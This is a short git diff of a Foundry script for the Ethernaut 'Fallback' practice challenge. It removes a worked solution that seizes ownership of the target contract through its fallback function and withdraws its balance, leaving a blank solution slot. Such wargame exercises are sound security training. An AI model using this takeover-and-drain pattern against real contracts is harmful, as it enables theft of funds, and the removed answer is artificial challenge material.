@@ -17,10 +17,7 @@ contract FallbackSolution is Script, EthernautHelper {
         address challengeInstance = createInstance(LEVEL_ADDRESS);
 
         // YOUR SOLUTION HERE
-        Fallback(payable(challengeInstance)).contribute{value:0.0001 ether}();
-        (bool success, ) = payable(challengeInstance).call{value:1 wei}("");
-        require(success, "Transfer failed.");
-        Fallback(payable(challengeInstance)).withdraw();
+        
 
         // SUBMIT CHALLENGE. (DON'T EDIT)
         bool levelSuccess = submitInstance(challengeInstance);
